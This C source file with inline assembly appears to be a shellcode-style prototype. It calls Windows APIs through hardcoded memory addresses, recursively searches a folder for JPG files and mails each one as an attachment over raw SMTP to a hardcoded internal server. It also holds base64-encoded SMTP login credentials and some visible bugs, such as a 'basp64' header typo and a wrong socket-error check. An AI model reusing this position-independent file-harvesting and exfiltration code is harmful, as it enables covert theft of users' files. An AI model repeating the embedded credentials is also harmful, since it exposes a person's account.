#define DATA    "From: <liujiquan@ase.com.cn>\r\n\
To: <liujiquan@ase.com.cn>\r\n\
Date: <liujiquan@ase.com.cn>\r\n\
Subject:Test Mail\r\n\
Mime-Version: 1.0\r\n\
Content-Type: multipart/mixed; boundary=\"INVT\"\r\n"

#define DATA_TEXT "\
--INVT\r\n\
Content-type: text/plain;\r\n\
Message\r\n\
--INVT\r\n"

#define DATA_FILE "\
Content-type: application/octet-stream;\r\n\
Content-Transfer-Encoding: basp64;\r\n\
Content-Disposition: attachment;\r\n\
  filename=\"%s\"\r\n\r\n"


#include <string>
void test()
{
//	HMODULE hModule = LoadLibrary("ws2_32.dll");
//	FARPROC func1 = GetProcAddress(hModule, "WSAStartup");
// 	FARPROC func2 = GetProcAddress(hModule, "socket");
//	FARPROC func3 = GetProcAddress(hModule, "connect");
//	FARPROC func4 = GetProcAddress(hModule, "send");
//	FARPROC func5 = GetProcAddress(hModule, "closesocket");
// 	FARPROC func6 = GetProcAddress(hModule, "WSACleanup");
//	FreeLibrary(hModule);

	char* szBuffer = "ws2_32.dll";
	_asm
	{	
$init:
		mov		eax, szBuffer
		push	eax
		mov		eax,7c801d78h   ;LOADLIBRARY
		call	eax
	}


//	WSADATA wsadata;
//	int nSize = sizeof(WSADATA);
//	if(WSAStartup(0x0202,&wsadata) !=0)  {   return ;}
	_asm
	{
$wsasatrtup:
		lea		eax, [ebp-190h]
		push 	eax
		push 	202h
		mov		eax, 71AB6A55h
		call	eax
		test	eax,eax
		jne		$end
	}

//	SOCKET server=socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
//	SOCKET server;
	_asm
	{
$socket:
		push	0
		push	1
		push	2
		mov		eax, 71ab4211h
		call	eax							;socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
		mov		dword ptr [ebp-20h],eax
;		mov		server, eax

		cmp     dword ptr [ebp-20h],0FFh	;if(server == -1)
		jne     $connect 
		xor     eax,eax
		jmp     $WSACleanup

	}
//	struct sockaddr_in ServerAddr;
//	ServerAddr.sin_family=0x0002;; 
//	ServerAddr.sin_addr.S_un.S_addr = 0x09010a0a;
//	ServerAddr.sin_port = 0x1900;
//	int nRet = connect(server, (sockaddr*)&ServerAddr, sizeof(ServerAddr));
	_asm
	{
	$connect:
		mov		ax, 0002h
		mov		[ebp-20h-8h], ax
		mov		eax, 9010A0Ah
		mov		[ebp-20h-4h], eax
		mov		ax, 1900h
		mov		[ebp-20h-6h], ax
		push	10h					; push
		lea		ecx,[ebp-20h-8h]
		push 	ecx
		mov		eax, [ebp-20h]
		push 	eax
		mov		eax, 71ab4a07h		; connect
		call	eax
		
		mov		[ebp-20h-8h-4h],eax	;nRet
		mov		eax, 0H
		cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 0)
		jne     $closesocket 
	}
	
	
	//	nRet = send(server, "HELO 10.10.1.9\r\n", 16, 0);
	szBuffer = "HELO 10.10.1.9\r\n";
	_asm
	{
$send1: 	
		push	0
		push	16
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		cmp     dword ptr [ebp-20h-8h-4h],10H	;	if(nRet == 10)
		jne     $closesocket 
	}
//	nRet = send(server, "AUTO LOGIN\r\n", 12, 0);
	szBuffer = "AUTO LOGIN\r\n";
	_asm
	{
$send2: 	
		push	0
		push	0Ch
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		cmp     dword ptr [ebp-20h-8h-4h],0Ch	;	if(nRet == 0Ch)
		jne     $closesocket 
	}

//	nRet = send(server, "MAIL FROM: liujiquan@ase.com.cn\r\n", 33, 0);
	szBuffer = "MAIL FROM: liujiquan@ase.com.cn\r\n";
	_asm
	{
$send3: 	
		push	0
		push	21h
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		cmp     dword ptr [ebp-20h-8h-4h],21h	;	if(nRet == 21h)
		jne     $closesocket 
	}
//	nRet = send(server, "RCPT TO: liujiquan@ase.com.cn\r\n", 31, 0);
	szBuffer = "RCPT TO: liujiquan@ase.com.cn\r\n";
	_asm
	{
$send4: 	
		push	0
		push	1Fh
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		cmp     dword ptr [ebp-20h-8h-4h],1Fh	;	if(nRet == 1Fh)
		jne     $closesocket 
	}
//	nRet = send(server, "DATA\r\n", 6, 0);
	szBuffer = "DATA\r\n";
	_asm
	{
$send5: 	
		push	0
		push	06h
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		cmp     dword ptr [ebp-20h-8h-4h],06h	;	if(nRet == 06h)
		jne     $closesocket 
	}

//	nRet = send(server, "From: <liujiquan@ase.com.cn>\r\nTo: <liujiquan@ase.com.cn>\r\nDate: 2014/09/17 16:57\r\nSubject:One Mail\r\nMime-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"INVT\"\r\n", 167, 0);
	szBuffer = "From: <liujiquan@ase.com.cn>\r\nTo: <liujiquan@ase.com.cn>\r\nDate: 2014/09/17 16:57\r\nSubject:One Mail\r\nMime-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"INVT\"\r\n";
	szBuffer = DATA;
	int i = strlen(szBuffer);
	_asm
	{
$send6: 	
	push	0
		push	i
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		mov		eax, i
		cmp     dword ptr [ebp-20h-8h-4h],eax	;	if(nRet == 0A7h)
		jne     $closesocket 
	}
	szBuffer = DATA_TEXT;
	i = strlen(szBuffer);
	_asm
	{
$send6_: 	
	push	0
		push	i
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		mov		eax, i
		cmp     dword ptr [ebp-20h-8h-4h],eax	;	if(nRet == 0A7h)
		jne     $closesocket 
	}
	szBuffer = DATA_FILE;
	i = strlen(szBuffer);
	_asm
	{
$send6__: 	
	push	0
		push	i
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		mov		eax, i
		cmp     dword ptr [ebp-20h-8h-4h],eax	;	if(nRet == 0A7h)
		jne     $closesocket 
	}
//	nRet = send(server, "--INVT--\r\n.\r\n", 13, 0);
	szBuffer = "--INVT--\r\n.\r\n";
	_asm
	{
$send7: 	
		push	0
		push	0Dh
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		cmp     dword ptr [ebp-20h-8h-4h],0Dh	;	if(nRet == 0Dh)
		jne     $closesocket 
	}
//	nRet = send(server, "QUIT\r\n", 6, 0);
	szBuffer = "QUIT\r\n";
	_asm
	{
$send8: 	
		push	0
		push	06H
		push    szBuffer
		mov		eax, dword ptr [ebp-20h]
		push	eax
		mov		eax, 71ab4c27h
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
		cmp     dword ptr [ebp-20h-8h-4h],06H	;	if(nRet == 06H)
		jne     $closesocket 
	}
//	closesocket(server);
	_asm
	{
$closesocket: 
		mov		eax, dword ptr [ebp-20h]
		push	eax	
		mov		eax, 0x71ab3e2b
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
	}

//	WSACleanup();
	_asm
	{
$WSACleanup: 
		mov		eax, 0x71ab3fed
		call	eax
		mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
	}

	_asm
	{
$end:
	}
//	system("pause");

}
#include <winsock2.h>
#include <wtypes.h>
void test2()
{
//	HMODULE hModule = LoadLibrary("user32.dll");
//	FARPROC func1 = GetProcAddress(hModule, "MessageBoxA");
//	FreeLibrary(hModule);
	char* szBuffer = "user32.dll";
	_asm
	{	
$init:
		mov		eax, szBuffer
		push	eax
		mov		eax,7c801d78h   ;LOADLIBRARY
		call	eax
	}
	_asm
	{
		push	0
		push	0
		push	0
		push	0
		mov		eax ,0x7e4507ea
		call	eax
	}
}

//  2014.09.26 Ver2.00[SearchFiles And Send To Mail.] Start
#pragma comment(lib,"ws2_32.lib");
/************************************************************************/
/* deinfe                                                                     */
/************************************************************************/
#define DATA_PREPARE \
"HELO 10.10.1.9\r\n\
AUTO LOGIN\r\n\
MAIL FROM: <liujiquan@ase.com.cn>\r\n\
RCPT TO: <liujiquan@ase.com.cn>\r\n\
DATA\r\n\
From: <liujiquan@ase.com.cn>\r\n\
To: <liujiquan@ase.com.cn>\r\n\
Date: 2014/09/26 11:16\r\n\
Subject:One Mail\r\n\
Mime-Version: 1.0\r\n\
Content-Type: multipart/mixed; boundary=\"INVT\"\r\n"

#define DATA_FILE2   "--INVT\r\n\
Content-type: application/octet-stream;\r\n\
Content-Transfer-Encoding: base64;\r\n\
Content-Disposition: attachment;\r\n\
  filename=\"%s\"\r\n\r\n"
/************************************************************************/
/* member                                                                     */
/************************************************************************/
SOCKET server;
/************************************************************************/
/* Function                                                                     */
/************************************************************************/
void SendFile3(LPCTSTR strFileName, LPCTSTR strFilePath);
void FindJpgFile(LPCTSTR strPath, LPCTSTR  strFilter);
//////////////////////////////////////////////////////////////////////////
char* szPath = "C:\\Work\\Pic";
char* szFilter = "*.jpg";
char* szData01 = "%s\\%s";
char* szDataFile = DATA_FILE2;
char* szData3 = "\r\n";
char* szDataValue = "liujiquanasdasdasd";
char* AllFile = "*.*";
char* szPrepare = DATA_PREPARE;
char* szSendExit = ".\r\nQUIT\r\n";
char* szBuffer = "ws2_32.dll";
//////////////////////////////////////////////////////////////////////////
void Test3_()
{
	WSADATA wsadata;
	int nSize = sizeof(WSADATA);
	if(WSAStartup(0x0202,&wsadata) !=0)  {   return ;}
	server=socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
	struct sockaddr_in ServerAddr;
	ServerAddr.sin_family=0x0002;; 
	ServerAddr.sin_addr.S_un.S_addr = 0x09010a0a;
	ServerAddr.sin_port = 0x1900;
	int nRet = connect(server, (sockaddr*)&ServerAddr, sizeof(ServerAddr));
	nRet = send(server, szPrepare, strlen(szPrepare), 0);
	FindJpgFile(szPath, szFilter);
	nRet = send(server, ".\r\nQUIT\r\n", 9, 0);
	closesocket(server);
	WSACleanup();
//	system("pause");
}
//  2014.11.17 Ver3.00[QQmailTest] Start
#define DATA_PREPARE4 \
"HELO 10.10.1.9\r\n\
auto login\r\n\
MAIL FROM: <liujiquan@ase.com.cn>\r\n\
RCPT TO: <liujiquan@ase.com.cn>\r\n\
DATA\r\n\
From: <liujiquan@ase.com.cn>\r\n\
To: <liujiquan@ase.com.cn>\r\n\
Subject: OneMail\r\n\
Date: 2014/11/11 11:11\r\n\
MIME-Version: 1.0\r\n\
Content-Type: multipart/mixed;\
	boundary=\"INVT_FILE\"\r\n\r\n"
	
#define DATA_SENDTEXT4	\
"--INVT_FILE\r\n\
Content-Type: text/plain;\r\n\
	charset=\"utf-8\"\r\n\
Content-Transfer-Encoding: quoted-printable\r\n\r\n"

#define DATA_SENDTEXT4BASE64	\
"--INVT_FILE\r\n\
Content-Type: text/plain;\r\n\
charset=\"utf-8\"\r\n\
Content-Transfer-Encoding: quoted-printable\r\n\r\n"

#define DATA_SENDTEXT4_END	"--INVT_TEXT--\r\n"

#define DATA_SENDFILE4_ONEBEGIN	\
"--INVT_FILE\r\n\
Content-Type: text/plain;\r\n\
	name=\"%s\"\r\n\
Content-Transfer-Encoding: 7bit\r\n\
Content-Disposition: attachment;\r\n\
	filename=\"%s\"\r\n\r\n"

#define DATA_SENDFILE4_BASE64_ONEBEGIN		\
"--INVT_FILE\r\n\
Content-Type: image/jpeg;\r\n\
	name=\"%s\"\r\n\
Content-Transfer-Encoding: base64\r\n\
Content-Disposition: attachment;\r\n\
	filename=\"%s\"\r\n\r\n"

#define DATA_SENDFILE4_ONEEND	"\r\n"
#define DATA_SENDFILE4_ALLEND	"--INVT_FILE--\r\n"

void Test4()
{
	WSADATA wsadata;
	int nSize = sizeof(WSADATA);
	if(WSAStartup(0x0202,&wsadata) !=0)  {   return ;}
	server=socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
	struct sockaddr_in ServerAddr;
	ServerAddr.sin_family=0x0002;; 
	ServerAddr.sin_addr.S_un.S_addr = 0x09010a0a;
	ServerAddr.sin_port = 0x1900;
	int nRet = connect(server, (sockaddr*)&ServerAddr, sizeof(ServerAddr));
	TCHAR szBufferTemp[MAX_PATH] = {0};
	nRet = send(server, "HELO 10.10.1.9\r\n", strlen("HELO 10.10.1.9\r\n"), 0);
	memset(szBufferTemp, 0x00, MAX_PATH);
	nRet = recv(server, szBufferTemp, MAX_PATH, 0);
	nRet = send(server, "AUTH LOGIN\r\n", strlen("AUTH LOGIN\r\n"), 0);
	memset(szBufferTemp, 0x00, MAX_PATH);
	nRet = recv(server, szBufferTemp, MAX_PATH, 0);
	nRet = send(server, "SmlxdWFuIExpdS9BU0VDTg==\r\n", strlen("SmlxdWFuIExpdS9BU0VDTg==\r\n"), 0);
	memset(szBufferTemp, 0x00, MAX_PATH);
	nRet = recv(server, szBufferTemp, MAX_PATH, 0);
	nRet = send(server, "YXNlXzEyMw==\r\n", strlen("YXNlXzEyMw==\r\n"), 0);
	memset(szBufferTemp, 0x00, MAX_PATH);
	nRet = recv(server, szBufferTemp, MAX_PATH, 0);
	nRet = send(server, "MAIL FROM: <liujiquan@ase.com.cn>\r\n", strlen("MAIL FROM: <liujiquan@ase.com.cn>\r\n"), 0);
	memset(szBufferTemp, 0x00, MAX_PATH);
	nRet = recv(server, szBufferTemp, MAX_PATH, 0);
	nRet = send(server, "RCPT TO: <liujiquan@ase.com.cn>\r\n", strlen("RCPT TO: <liujiquan@ase.com.cn>\r\n"), 0);
	memset(szBufferTemp, 0x00, MAX_PATH);
	nRet = recv(server, szBufferTemp, MAX_PATH, 0);
	nRet = send(server, "DATA\r\n", strlen("DATA\r\n"), 0);
	memset(szBufferTemp, 0x00, MAX_PATH);
	nRet = recv(server, szBufferTemp, MAX_PATH, 0);
	nRet = send(server, "From: <liujiquan@ase.com.cn>\r\n", strlen("From: <liujiquan@ase.com.cn>\r\n"), 0);
	nRet = send(server, "To: <liujiquan@ase.com.cn>\r\n", strlen("To: <liujiquan@ase.com.cn>\r\n"), 0);
	nRet = send(server, "Subject: OneMail\r\n", strlen("Subject: OneMail\r\n"), 0);
	nRet = send(server, "Date: 2014/11/11 11:11\r\n", strlen("Date: 2014/11/11 11:11\r\n"), 0);
	nRet = send(server, "MIME-Version: 1.0\r\n", strlen("MIME-Version: 1.0\r\n"), 0);
	nRet = send(server, "Content-Type: multipart/mixed;", strlen("Content-Type: multipart/mixed;"), 0);
	nRet = send(server, "	boundary=\"INVT_FILE\"\r\n\r\n", strlen("	boundary=\"INVT_FILE\"\r\n\r\n"), 0);
	// SendText
	nRet = send(server, DATA_SENDTEXT4, strlen(DATA_SENDTEXT4), 0);
//	for(int i = 0; i < 1; i++)
//	{
//		nRet = send(server, "123", strlen("123"), 0);		
//	}
//	nRet = send(server, DATA_SENDTEXT4_END, strlen(DATA_SENDTEXT4_END), 0);
	// Send File
//	for(int i = 0; i < 3; i++)
//	{
//		nRet = send(server, DATA_SENDFILE4_ONEBEGIN, strlen(DATA_SENDFILE4_ONEBEGIN), 0);
//		nRet = send(server, "123", strlen("123"), 0);
//		nRet = send(server, DATA_SENDFILE4_ONEEND, strlen(DATA_SENDFILE4_ONEEND), 0);
//	}
//	FindJpgFile(szPath, "*.txt");
//	nRet = send(server, DATA_SENDFILE4_ALLEND, strlen(DATA_SENDFILE4_ALLEND), 0);
	nRet = send(server, "--INVT_FILE--\r\n.\r\n", 16, 0);
	nRet = send(server, "QUIT\r\n", 6, 0);
	closesocket(server);
	WSACleanup();
	//	system("pause");
}
//  2014.11.17 Ver3.00[QQmailTest] End
void Test3()
{
/*	WSADATA wsadata;
	int nSize = sizeof(WSADATA);
	if(WSAStartup(0x0202,&wsadata) !=0)  {   return ;}
	server=socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
	struct sockaddr_in ServerAddr;
	ServerAddr.sin_family=0x0002;; 
	ServerAddr.sin_addr.S_un.S_addr = 0x09010a0a;
	ServerAddr.sin_port = 0x1900;
	int nRet = connect(server, (sockaddr*)&ServerAddr, sizeof(ServerAddr));
*/		
//	HMODULE hModule = LoadLibrary("KERNEL32");
//	FARPROC funcLoadl = GetProcAddress(hModule, "LoadLibraryA");//0x7c801a28
//	FreeLibrary(hModule);
_asm
{
	push	ebp			
	mov		ebp,esp		
	sub		esp,400H
	push	ebx
	push	esi
	push	edi
	lea		edi, [ebp-200H]
	mov		ecx, 80H	
	mov		eax, 0H				
	rep		stosd
$init:
	mov		eax, szBuffer
	push	eax
	mov		eax,7c801d7bH   ;LOADLIBRARY	
	call	eax
$wsasatrtup:
	lea		eax, [ebp-190h]
	push 	eax
	push 	202h
	mov		eax, 71AB6A55h
	call	eax
	test	eax,eax
	jne		$end
$socket:
	push	0
	push	1
	push	2
	mov		eax, 71ab4211h
	call	eax							;socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
	mov		[ebp-20h],eax
	mov		server, eax

	cmp     [ebp-20h],0FFh	;if(server == -1)
	jne     $connect 
	xor     eax,eax
	jmp     $WSACleanup
		
$connect:
	mov		ax, 0002h
	mov		[ebp-20h-8h], ax
	mov		eax, 9010A0Ah
	mov		[ebp-20h-4h], eax
	mov		ax, 1900h
	mov		[ebp-20h-6h], ax
	push	10h					; push
	lea		ecx,[ebp-20h-8h]
	push 	ecx
	mov		eax, [ebp-20h]
	push 	eax
	mov		eax, 71ab4a07h		; connect
	call	eax
	
	mov		[ebp-20h-8h-4h],eax	;nRet
	mov		eax, 0H
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 0)
	jne     $closesocket 
;First:sendprepare
	push	[ebp-20h]
	call	$sendprepare
	add		esp,4
;Second:sendfile
	push	[ebp-20h]
	call	$sendfilemain
	add		esp,4
;Third:sendExit
	push	[ebp-20h]
	call	$sendExit
	add		esp,4
	jmp		$closesocket
$sendprepare:
	push	ebp			
	mov		ebp,esp		
	sub		esp,200H
	push	ebx
	push	esi
	push	edi
	lea		edi, [ebp-200H]
	mov		ecx,40H	
	mov		eax, 0H				
	rep		stosd
	
	push	szPrepare
	mov		eax,7c902645H
	call	eax
	add		esp, 4
	mov		[ebp-4H],eax
	
	push	0
	push	[ebp-4H]
	push	szPrepare
	push	[ebp+8H]
	mov		eax, 71ab4c27H
	call	eax					;send(server, szBuffer, strlen(szBuffer), 0);

	pop		edi
	pop		esi
	pop		ebx
	add		esp,200H
	mov		esp, ebp
	pop     ebp	
	ret
$sendfilemain:	;1)searchfile 2)sendfile
	push	ebp			
	mov		ebp,esp		
	sub		esp,0CH
	push	ebx
	push	esi
	push	edi
	lea		edi, [ebp-0CH]
	mov		ecx,3H	
	mov		eax, 0H				
	rep		stosd

	push	[ebp+8]	;server
	push	szFilter
	push	szPath
	call	$searchfile 
	add		esp, 08H		
	jmp		$_END
$searchfile:
	push	ebp			
	mov		ebp,esp		
	sub		esp,400H
	push	ebx
	push	esi
	push	edi
	lea		edi, [ebp-200H]
	mov		ecx,80H	; 
	mov		eax, 0H				
	rep		stosd

	mov		eax,[ebp+8]		; strPath
	mov		ebx,[ebp+12]	; strFilter
	
	mov		ecx,0H			
	cmp		eax, ecx
	je		_searchfileend	; strPath == NULL 
	cmp		ebx, ecx
	je		_searchfileend	; strFilter == NULL
_findfile:
	;sprintf(szFilePath, "%s%s",strPath, strFilter);		
	lea		ecx, [ebp-104h]				;TCHAR szFilePath[MAX_PATH] 
	push	ebx
	push	eax
	push    ecx
	call	$sprintf
	add		esp,12

	;long handle = (long)::FindFirstFile(szFilePath, &findData);
	lea		eax, [ebp-140h-104h]		;$findData
	push    eax
	lea		eax, [ebp-104h]				;$szFilePath
	push	eax	
	mov		eax, 7c82f9f9H
	call	eax
	mov		[ebp-104h-140h-4H],eax		;$handle 0x00148968

	;if(handle != 0xFFFFFFFF)
	mov		ebx, 0FFFFFFFFH
	cmp		ebx, [ebp-104h-140h-4H]			;
	je		_finddir
	
	;BOOL bRet = TRUE;
	lea		eax, [ebp-104h-140h-4H-4H]		
	mov		[ebp-104h-140h-4H-4H], 1
_findfile_while:
	;memset(szFilePath, 0x00, MAX_PATH);
	push    104H	
	lea		eax,  [ebp-104h]
	push    eax
	call	$memset
	add		esp, 8
	
	;sprintf(szFilePath, "%s\\%s",strPath, findData.cFileName);
	lea		eax, [ebp-104h-114H]		;$findData.cFileName
	push    eax					
	push    [ebp+8]							; strPath
	lea		eax, [ebp-104h]					;$szFilePath
	push	eax	 
	call    $sprintf
	add		esp, 12
	
	push	[ebp+16]	;server
	lea		eax, [ebp-104h]					;$szFilePath
	push	eax	 
	lea		eax, [ebp-104h-114H]			;$findData.cFileName
	push    eax	
	call	$sendfile
	add		esp, 12
_findfile_next:
	;bRet = FindNextFile((HANDLE)handle, &findData);
	lea		eax, [ebp-140h-104h]		;$findData
	push    eax
	push    [ebp-104h-140h-4H]			;handle
	mov		eax, 7c834f51H
	call    eax
	mov     [ebp-104h-140h-4H-4H], eax	;bRet
	mov		eax, 1
	cmp		eax, [ebp-104h-140h-4H-4H]
	je		_findfile_while
_findfile_close:
	;FindClose((HANDLE)handle);
	mov		eax, [ebp-104h-114H]
	push	eax
	mov		eax, 7c80ee9cH
	call	eax	
_finddir:
	mov     [ebp-104h-140h-4H-4H], 1	;bRet
	;memset(szFilePath, 0x00, MAX_PATH);
	push    104H	
	lea		eax,  [ebp-104h]
	push    eax
	call	$memset
	add		esp, 8
	;sprintf(szFilePath, "%s%s",strPath, AllFile);
	push	AllFile				
	push    [ebp+8]							; strPath
	lea		eax, [ebp-104h]					;$szFilePath
	push	eax	 
	call    $sprintf
	add		esp, 12
	;handle = (long)::FindFirstFile(szFilePath, &findData);
	lea		eax, [ebp-140h-104h]		;$findData
	push    eax
	lea		eax, [ebp-104h]				;$szFilePath
	push	eax	
	mov		eax, 7c82f9f9H
	call	eax
	mov		[ebp-104h-140h-4H],eax		;$handle 0x00148968
	;if(handle != 0xFFFFFFFF)
	mov		ebx, 0FFFFFFFFH
	cmp		ebx, [ebp-104h-140h-4H]			;
	je		_searchfileend
_finddir_while:
	mov		eax, [ebp-104h-140H]		;findData.dwFileAttributes 
	and		eax, 00000010H
	je		_FindDir_Next
	mov		AH, [ebp-104h-114H]
	mov		AL, 2EH
	cmp		AH,AL
	je		_finddir_next
	;memset(szFilePath, 0x00, MAX_PATH);
	push    104H	
	lea		eax,  [ebp-104h]
	push    eax
	call	$memset
	add		esp, 8
	;sprintf(szFilePath, "%s%s",strPath, findData.cFileName);
	lea		eax, [ebp-104h-114H]			;$findData.cFileName
	push    eax					
	push    [ebp+8]							; strPath
	lea		eax, [ebp-104h]					;$szFilePath
	push	eax	 
	call    $sprintf
	add		esp, 12

	push	[ebp+16]	;server
	push	szFilter	
	lea		eax, [ebp-104h]	
	push	eax
	call	$searchfile
	add		esp, 12
_finddir_next:
	lea		eax, [ebp-140h-104h]		;$findData
	push    eax
	push    [ebp-104h-140h-4H]			;handle
	mov		eax, 7c834f51H
	call    eax
	mov     [ebp-104h-140h-4H-4H], eax	;bRet
	mov		eax, 1
	cmp		eax, [ebp-104h-140h-4H-4H]
	je		_finddir_while
_finddir_close:
	;FindClose((HANDLE)handle);
	mov		eax, [ebp-104h-114H]
	push	eax
	mov		eax, 7c80ee9cH
	call	eax	
_searchfileend:
	pop		edi
	pop		esi
	pop		ebx
	add     esp, 400H
	pop		ebp
	ret
$sprintf:
	push	ebp			
	mov		ebp,esp			
	sub		esp,0CH		
	push	ebx
	push	esi
	push	edi
	lea		edi, [ebp-0CH]
	mov		ecx, 3H	
	mov		eax, 0H				
	rep		stosd

	mov		eax,[ebp+16]	;strFilter
	push	eax
	mov		eax,[ebp+12]	;strPath
	push	eax
	push	szData01		;"%s%s"
	mov		eax,[ebp+8]		;szFilePath
	push	eax
	
	mov		eax,7c9245b4H	
	call	eax				;sprintf(szFilePath, "%s\%s",strPath, strFilter);
	add		esp, 16

	pop		edi
	pop		esi
	pop		ebx
	add		esp, 0CH
	pop     ebp			
	ret
$memset:
	push	ebp			
	mov		ebp,esp			
	sub		esp,0CH		
	push	ebx
	push	esi
	push	edi
	lea		edi, [ebp-0CH]
	mov		ecx, 3H	
	mov		eax, 0H				
	rep		stosd

	mov		eax,[ebp+12]	;MAX_PATH
	push	eax
	push	0
	mov		eax,[ebp+8]		;szFilePath
	push	eax
	mov		eax,7c902435H	
	call	eax				;memset(szFilePath, 0x00, MAX_PATH);
	add		esp, 12

	pop		edi
	pop		esi
	pop		ebx
	add		esp, 0CH
	pop     ebp			
	ret
$sendfile:
	push	ebp			
	mov		ebp,esp			
	sub		esp,200H		
	push	ebx
	push	esi
	push	edi
	lea		edi, [ebp-200H]
	mov		ecx, 40H	
	mov		eax, 0H				
	rep		stosd

	;Sleep(1);
	mov		eax, 1h
	push	eax
	mov		eax, 7c802446H
	call	eax				
	
	;sprintf(szBuffer, DATA_FILE2, strFileName);
	push	[ebp+8]
	push	szDataFile
	lea		eax, [ebp-104H]
	push	eax
	mov		eax, 7c9245b4H	
	call	eax
	add		esp, 12

	lea		eax, [ebp-104H]
	push	eax
	mov		eax,7c902645H
	call	eax
	add		esp, 4
	mov		[ebp-104H-4H],eax

	push	0
	push	[ebp-104H-4H]
	lea		eax, [ebp-104H]
	push	eax
	push	[ebp+16]	;server
	mov		eax, 71ab4c27H
	call	eax					;send(server, szBuffer, strlen(szBuffer), 0);	
_sendvalue:
	;HANDLE handle = CreateFile(strFilePath, GENERIC_READ, FILE_SHARE_READ,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	push	0
	push	00000080H
	push	3
	push	0
	push	1
	push	80000000H
	push	[ebp+12]
	mov		eax,7c801a28H
	call	eax
	mov		[ebp-104H-4H-4H], eax	;handle
	;if(handle != INVALID_HANDLE_VALUE)
	mov		eax, 0FFFFFFFFH
	cmp		eax, [ebp-104H-4H-4H]
	je		_sendfile_end
	
	;memset(szFilePath, 0x00, MAX_PATH);
	push    104H	
	lea		eax,  [ebp-104h]
	push    eax
	call	$memset
	add		esp, 8
	;DWORD nRead 
	;BOOL bRet = ReadFile(handle, szBuffer, MAX_PATH, &nRead, NULL);
	push	0
	lea		eax, [ebp-104H-4H-4H-4H]	;nRead
	push	eax								
	push	104H						;MAX_PATH
	lea		eax,  [ebp-104h]			;szBuffer
	push    eax
	push	[ebp-104H-4H-4H]			;handle
	mov		eax, 7c801812H
	call	eax
	mov		[ebp-104H-4H-4H-4H-4H],eax	;bRet
_sendfile_while:
	;while(bRet && nRead > 0)
	mov		eax, 0
	cmp		eax, [ebp-104H-4H-4H-4H-4H]		;bRet
	je		_CloseHandle
	cmp		eax, [ebp-104H-4H-4H-4H]		;nRead
	JAE		_closehandle

	;nRet = send(server, szBuffer, nRead, 0);
	push	0
	mov		eax,  [ebp-104H-4H-4H-4H]
	push	eax
	lea		eax,  [ebp-104h]
	push    eax
	push	[ebp+16]	;server
	mov		eax,71ab4c27H
	call	eax
	;BOOL bRet = ReadFile(handle, szBuffer, MAX_PATH, &nRead, NULL);
	push	0
	lea		eax, [ebp-104H-4H-4H-4H]
	push	eax			
	push	104H
	lea		eax,  [ebp-104h]			;szBuffer
	push    eax			
	push	[ebp-104H-4H-4H]			;handle
	mov		eax,7c801812H
	call	eax					
	mov		[ebp-104H-4H-4H-4H-4H],eax	;bRet
	jmp		_sendfile_while
_closehandle:
	push	[ebp-104H-4H-4H]			;handle
	mov		eax, 0x7c809be7
	call	eax
_sendfile_end:
	push	0
	push	2
	push	szData3
	push	[ebp+16]	;server
	mov		eax, 71ab4c27H
	call	eax
	mov		[ebp-104H-4H],eax
	
	pop		edi
	pop		esi
	pop		ebx
	add		esp, 200H
	pop     ebp			
	ret
$_END:	
	pop		edi
	pop		esi
	pop		ebx
	add		esp,0CH
	mov		esp, ebp
	pop     ebp	
	ret
$sendExit: 	
	push	ebp			
	mov		ebp,esp			
	sub		esp,0CH		
	push	ebx
	push	esi
	push	edi
	lea		edi, [ebp-0CH]
	mov		ecx, 3H	
	mov		eax, 0H				
	rep		stosd

	push	0
	push	09H
	push    szSendExit
	push	[ebp+8H]
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	cmp     [ebp-20h-8h-4h],09H	;	if(nRet == 06H)
	jne     $closesocket

	pop		edi
	pop		esi
	pop		ebx
	add		esp, 0CH
	pop     ebp			
	ret
$closesocket: 
	mov		eax, dword ptr [ebp-20h]
	push	eax	
	mov		eax, 0x71ab3e2b
	call	eax
	mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
$WSACleanup: 
	mov		eax, 0x71ab3fed
	call	eax
	mov		dword ptr [ebp-20h-8h-4h],eax		;nRet
$end:
	pop		edi
	pop		esi
	pop		ebx
	add		esp,200H
	mov		esp, ebp
	pop     ebp	
}

//	int nRet = send(server, ".\r\nQUIT\r\n", 9, 0);

//	system("pause");	
